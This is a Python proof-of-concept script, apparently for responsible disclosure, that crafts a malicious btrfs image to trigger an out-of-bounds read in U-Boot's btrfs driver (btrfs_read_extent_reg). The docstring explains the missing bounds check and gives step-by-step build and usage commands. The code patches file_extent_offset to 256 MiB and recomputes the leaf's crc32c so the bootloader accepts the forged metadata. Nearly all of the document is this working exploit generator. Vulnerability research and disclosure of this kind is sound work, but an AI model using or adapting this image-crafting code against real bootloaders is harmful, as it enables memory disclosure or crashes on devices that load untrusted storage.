#!/usr/bin/env python3
"""
Proof-of-Concept: out-of-bounds read in U-Boot's btrfs driver
(btrfs_read_extent_reg, fs/btrfs/inode.c).

DEFENSIVE / RESEARCH USE ONLY.
This script builds a crafted btrfs image used to confirm, via AddressSanitizer,
a vulnerability discovered by source review of U-Boot's open-source code. It is
intended for confirm-and-report (responsible disclosure) on your own test
system. The image is a test artifact that makes a sanitizer fire on an
out-of-bounds read; it is not a weapon.

BUG SUMMARY
-----------
In btrfs_read_extent_reg(), for a compressed extent, U-Boot allocates a buffer
'dbuf' of size 'ram_bytes' (the decompressed extent size, taken from the image)
and then copies from:

    memcpy(dest,
           dbuf + btrfs_file_extent_offset(leaf, fi) + offset - key.offset,
           len);

The value btrfs_file_extent_offset() is read straight from the on-disk extent
item and is never validated against 'ram_bytes' (the dbuf size). The only guard
is an ASSERT() which:
  (a) is compiled out in production builds (U-Boot's assert() is a no-op unless
      _DEBUG is set), and
  (b) does not even check file_extent_offset against ram_bytes.
U-Boot also does not import btrfs's semantic tree-checker, so file_extent_offset
is never sanity-checked at leaf load time either.

A malicious btrfs image with a large file_extent_offset therefore makes the
memcpy read far past the end of dbuf -> out-of-bounds read in a bootloader.

HOW THIS SCRIPT WORKS
---------------------
1. Starts from a clean, valid btrfs image (single-profile metadata, one file
   with a compressed extent).
2. Locates the first EXTENT_DATA item inside the specific metadata leaf that
   U-Boot reads, and overwrites its file_extent_offset field with a large value.
3. Recomputes the crc32c checksum of that single metadata block so U-Boot
   accepts it as valid and proceeds to the vulnerable memcpy.

PREREQUISITES
-------------
  - btrfs-progs (mkfs.btrfs, btrfs inspect-internal)
  - python3, optionally the 'crc32c' module (falls back to a pure-python impl)

USAGE
-----
  # 1. Build a clean base image (single metadata so there is only one copy):
  dd if=/dev/zero of=btrfs_base.img bs=1M count=128
  mkfs.btrfs -f -m single -d single btrfs_base.img
  sudo mount -o loop,compress=zlib btrfs_base.img /mnt
  sudo python3 -c "open('/mnt/testfile','w').write('A'*1048576)"
  sync ; sudo umount /mnt

  # 2. Read the layout and pass the required values to this script:
  sudo btrfs inspect-internal dump-tree btrfs_base.img | grep -A4 EXTENT_DATA

  # 3. Run this script with the first extent's disk_bytenr and the leaf offset
  #    (the leaf offset is the block U-Boot reports in a checksum error, or can
  #    be found by locating the extent item's containing node):
  python3 make_btrfs_oob_poc.py --disk-bytenr 13631488 --leaf 5488640

  # 4. Load it in a sandbox U-Boot built with ASan:
  #      host bind 0 /path/to/btrfs_poc.img
  #      load host 0 0x1000000 testfile
  #    -> AddressSanitizer reports a READ overflow in memcpy, called from
  #       btrfs_read_extent_reg (fs/btrfs/inode.c).
"""
import argparse
import struct
import shutil
import sys

NODESIZE = 16384                 # btrfs node size (from mkfs output)
RAM_BYTES = 131072               # decompressed extent size (dbuf size)
NEW_EXTENT_OFF = 0x10000000      # 256 MiB: far beyond dbuf -> guaranteed OOB
FIELD_OFF_IN_ITEM = 37           # offset of 'offset' inside btrfs_file_extent_item

# on-disk struct btrfs_file_extent_item (53 bytes), field offsets:
#   +0  generation   u64
#   +8  ram_bytes    u64
#   +16 compression  u8
#   +17 encryption   u8
#   +18 other_enc    u16
#   +20 type         u8
#   +21 disk_bytenr  u64
#   +29 disk_num     u64
#   +37 offset       u64   <- file_extent_offset (the target)
#   +45 num_bytes    u64


def get_crc32c():
    try:
        from crc32c import crc32c as _c
        return _c
    except ImportError:
        def _c(data, crc=0):
            poly = 0x82F63B78
            crc ^= 0xFFFFFFFF
            for b in data:
                crc ^= b
                for _ in range(8):
                    crc = (crc >> 1) ^ (poly & -(crc & 1))
            return crc ^ 0xFFFFFFFF
        return _c


def main():
    ap = argparse.ArgumentParser(description="Craft a malicious btrfs image "
                                             "for the U-Boot OOB read PoC.")
    ap.add_argument("--src", default="btrfs_base.img",
                    help="clean base image (default: btrfs_base.img)")
    ap.add_argument("--dst", default="btrfs_poc.img",
                    help="output crafted image (default: btrfs_poc.img)")
    ap.add_argument("--disk-bytenr", type=int, required=True,
                    help="disk_bytenr of the first extent (from dump-tree)")
    ap.add_argument("--leaf", type=int, required=True,
                    help="file offset of the metadata leaf U-Boot reads")
    args = ap.parse_args()

    crc32c = get_crc32c()

    shutil.copy(args.src, args.dst)
    data = bytearray(open(args.dst, "rb").read())

    # Pattern that identifies the first extent item inside the leaf:
    #   ram_bytes(8) | compression=1 | encryption=0 | other_enc=0 | type=1 | disk_bytenr(8)
    ram = struct.pack("<Q", RAM_BYTES)
    disk = struct.pack("<Q", args.disk_bytenr)
    pattern = ram + b"\x01\x00\x00\x00\x01" + disk

    block = data[args.leaf:args.leaf + NODESIZE]
    rel = block.find(pattern)
    if rel < 0:
        print(f"[!] extent pattern not found in leaf at {args.leaf}.")
        gi = data.find(pattern)
        if gi >= 0:
            print(f"[!] pattern found globally at {gi} "
                  f"(node {(gi // NODESIZE) * NODESIZE}); pass that as --leaf.")
        sys.exit(1)

    item_start = args.leaf + rel - 8
    field_pos = item_start + FIELD_OFF_IN_ITEM
    old = struct.unpack_from("<Q", data, field_pos)[0]
    struct.pack_into("<Q", data, field_pos, NEW_EXTENT_OFF)
    print(f"[+] extent item at file offset {item_start}")
    print(f"[+] file_extent_offset {old} -> {NEW_EXTENT_OFF} "
          f"(0x{NEW_EXTENT_OFF:x})")

    # Recompute the crc32c of this single metadata block. In btrfs the first
    # 32 bytes of a node hold the checksum field; the checksum covers bytes
    # [32 : NODESIZE].
    body = bytes(data[args.leaf + 32:args.leaf + NODESIZE])
    new_csum = crc32c(body) & 0xFFFFFFFF
    struct.pack_into("<I", data, args.leaf, new_csum)
    print(f"[+] recomputed crc32c of leaf @{args.leaf}: {new_csum:08x}")

    open(args.dst, "wb").write(data)
    print(f"[+] wrote {args.dst}")
    print("[!] Load in ASan-instrumented sandbox U-Boot:")
    print("[!]   host bind 0 <abs-path>/btrfs_poc.img")
    print("[!]   load host 0 0x1000000 testfile")
    print("[!] Expected: AddressSanitizer READ overflow in memcpy,")
    print("[!] called from btrfs_read_extent_reg (fs/btrfs/inode.c).")


if __name__ == "__main__":
    main()
